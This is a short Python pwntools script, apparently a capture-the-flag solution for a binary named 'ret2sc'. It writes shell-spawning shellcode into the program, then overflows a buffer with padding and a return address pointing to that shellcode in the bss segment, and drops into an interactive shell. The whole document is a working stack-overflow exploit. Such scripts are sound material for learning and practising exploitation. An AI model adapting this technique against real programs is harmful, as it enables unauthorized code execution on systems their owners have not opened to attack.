from pwn import*

p=process('./ret2sc')
context.arch = 'amd64' #if without this words ,it will be error
p.recvuntil(': ')
shellcode=asm(shellcraft.sh()) #through this get the shell
p.send(shellcode)

ret2addr=0x601060 #bss:0000000000601060 message 
payload=0x18*'a'+p64(ret2addr)
p.recvuntil(': ')

p.send(payload)


p.interactive()
